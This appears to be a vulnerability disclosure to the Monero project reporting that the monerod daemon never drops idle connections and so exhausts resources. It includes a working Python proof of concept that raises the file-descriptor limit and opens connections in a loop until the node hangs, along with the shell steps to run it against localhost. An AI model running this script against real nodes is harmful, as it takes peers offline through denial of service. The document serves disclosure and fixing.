## Summary:
Unbounded resource usage due to open one file descriptor per connection, Python script below is effectively a threadbomb on the destination and uses all available memory on the server, clients not sending anything are never terminated.

## Steps To Reproduce:
Up our daemon
```
% monerod
```
Check if peer accepting connection
```
% nc -vz 127.0.0.1 18080
Connection to 127.0.0.1 18080 port [tcp/*] succeeded!
```
Create python script ex: resus.py
```python
import resource
import socket
import time

resource.setrlimit(resource.RLIMIT_NOFILE, (131072, 131072))

conn = []

while True:
    try:
        conn.append(socket.create_connection(("127.0.0.1", 18080)))
    except BaseException as err:
        print(err)
        break

print(len(conn))

while True:
    time.sleep(1)
```
run the script as ROOT(required for setting RLIMIT)
```
% sudo python resus.py
```
wait up 2 to minutes then run netcat again to check if our socket request bomb deny the service
```
% nc -vz 127.0.0.1 18080
```
now it's completely hang, during waiting you can run command ```lsof -i tcp``` to see lot of Monero connections

## Impact

Denial of Service(Allocation of Resources Without Limits or Throttling)
